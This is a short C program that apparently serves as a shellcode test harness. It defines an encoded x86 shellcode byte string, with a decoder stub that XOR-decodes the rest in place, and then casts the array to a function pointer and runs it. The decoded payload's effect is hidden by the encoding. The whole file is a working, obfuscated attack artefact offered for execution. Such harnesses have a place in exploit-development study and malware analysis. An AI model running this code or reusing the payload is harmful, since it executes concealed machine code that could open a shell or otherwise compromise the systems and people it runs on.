#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1c\x5e\x89\xf7\x31\xc9\x89\xca\xb1\x59\x8a\x06\x8a\x5e\x01\x30\xd8\x88\x07\x46\x47\xe2\xf3\xc6\x46\xff\x90\xeb\x05\xe8\xdf\xff\xff\xff\x2c\x46\x20\x78\x49\x9b\xaa\x71\x32\x60\x33\x59\x5b\xd2\x33\xfe\x7e\xec\x86\xe0\xb8\xd0\x8b\x05\x5b\x1d\x7b\x13\x02\x5e\x1d\x7b\x28\xa1\x40\x2a\x3a\x6b\x39\xb0\x51\x12\xdf\x5f\xd8\x02\xb2\x8d\xbc\x75\xb8\x38\x88\xb7\xf6\x3b\xbb\x0b\x34\x75\xb8\x38\x88\x83\xb2\x60\x51\x98\xca\xa2\x8d\xa2\xd1\xb9\xd1\xfe\x9c\xf5\x9b\x12\xf1\xa3\x2a\xc8\x9b\x12\xf3\x3e\xbe";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}